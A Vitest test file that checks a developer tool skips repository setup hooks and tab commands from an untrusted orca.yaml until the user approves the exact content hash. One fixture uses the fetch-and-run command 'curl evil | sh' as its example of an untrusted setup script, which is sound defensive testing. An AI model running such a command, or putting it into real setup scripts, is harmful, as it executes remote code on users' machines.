import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { Repo } from '../../shared/repo-types'
import { getDefaultRepoHookSettings } from '../../shared/constants'

const mocks = vi.hoisted(() => ({
  effectiveHooks: vi.fn(),
  loadHooks: vi.fn(),
  runHook: vi.fn()
}))

vi.mock('../hooks', () => ({
  getEffectiveHooks: mocks.effectiveHooks,
  loadHooks: mocks.loadHooks,
  runHook: mocks.runHook
}))

import { createHash } from 'node:crypto'
import type { PersistedTrustedOrcaHooks } from '../../shared/orca-yaml-hook-types'
import { prepareRuntimeLocalWorktreeSetup } from './runtime-local-worktree-setup'

const askRepo: Repo = {
  id: 'repo-1',
  path: '/repo',
  displayName: 'Repo',
  badgeColor: '#000000',
  addedAt: 0,
  hookSettings: { ...getDefaultRepoHookSettings(), setupRunPolicy: 'ask' }
}

function prepare(
  request: { setupDecision?: 'run' | 'skip' | 'inherit'; setupTrustHash?: string } = {},
  options: { repo?: Repo; trusted?: PersistedTrustedOrcaHooks } = {}
) {
  const repo = options.repo ?? askRepo
  return prepareRuntimeLocalWorktreeSetup({
    request: { repoSelector: 'repo-1', name: 'app', ...request },
    repo,
    worktreePath: '/worktrees/app',
    // oxlint-disable-next-line typescript/consistent-type-assertions -- SAFETY: settings are read only by the setup runner, which this in-process path never builds.
    settings: {} as never,
    store: { getRepos: () => [repo], getUI: () => ({ trustedOrcaHooks: options.trusted ?? {} }) },
    runtimeTarget: undefined,
    shouldUseSetupRunner: false
  })
}

describe('runtime create setup for a hook the new branch added', () => {
  beforeEach(() => {
    vi.resetAllMocks()
    mocks.runHook.mockResolvedValue({ success: true, output: '' })
    mocks.effectiveHooks.mockReturnValue({ scripts: { setup: 'pnpm install' } })
  })

  it('skips setup with a warning instead of failing a create that already added the worktree', async () => {
    const result = await prepare()

    expect(result.shouldRunSetup).toBe(false)
    expect(result.warning).toContain('pass --setup run to run it')
    expect(mocks.runHook).not.toHaveBeenCalled()
  })

  it('still runs setup when the caller decided to', async () => {
    const result = await prepare({ setupDecision: 'run' })

    expect(result.shouldRunSetup).toBe(true)
    expect(mocks.runHook).toHaveBeenCalledOnce()
  })
})

describe('runtime create setup from an orca.yaml nobody trusted (Pod)', () => {
  const runByDefault: Repo = { ...askRepo, hookSettings: getDefaultRepoHookSettings() }
  const yaml = {
    scripts: { setup: 'curl evil | sh' },
    defaultTabs: [{ title: 'Dev', command: 'make dev' }]
  }
  const hash = createHash('sha256')
    .update('curl evil | sh\n\n# defaultTabs[1] Dev\nmake dev')
    .digest('hex')

  beforeEach(() => {
    vi.resetAllMocks()
    mocks.runHook.mockResolvedValue({ success: true, output: '' })
    mocks.loadHooks.mockReturnValue(yaml)
    mocks.effectiveHooks.mockReturnValue({ scripts: { setup: yaml.scripts.setup } })
  })

  it('skips setup and tab commands under the default policy, even when the caller said run', async () => {
    for (const setupDecision of ['inherit', 'run'] as const) {
      const result = await prepare({ setupDecision }, { repo: runByDefault })
      expect(result.shouldRunSetup).toBe(false)
      expect(result.setupTrust).toEqual({ status: 'needs-trust', contentHash: hash })
      expect(result.defaultTabs?.runCommands).toBe(false)
      expect(result.warning).toContain("isn't trusted yet")
    }
    expect(mocks.runHook).not.toHaveBeenCalled()
  })

  it('runs it for the hash the user approved, or the one recorded for the repo', async () => {
    expect((await prepare({ setupTrustHash: hash }, { repo: runByDefault })).shouldRunSetup).toBe(
      true
    )
    const recorded = { 'repo-1': { setup: { contentHash: hash, approvedAt: 1 } } }
    const result = await prepare({}, { repo: runByDefault, trusted: recorded })
    expect(result.shouldRunSetup).toBe(true)
    expect(result.setupTrust).toBeUndefined()
    expect(mocks.runHook).toHaveBeenCalledTimes(2)
  })

  it('does not take a trust recorded for other content', async () => {
    const recorded = { 'repo-1': { setup: { contentHash: 'f'.repeat(64), approvedAt: 1 } } }
    const result = await prepare(
      { setupTrustHash: 'e'.repeat(64) },
      { repo: runByDefault, trusted: recorded }
    )
    expect(result.shouldRunSetup).toBe(false)
    expect(mocks.runHook).not.toHaveBeenCalled()
  })
})
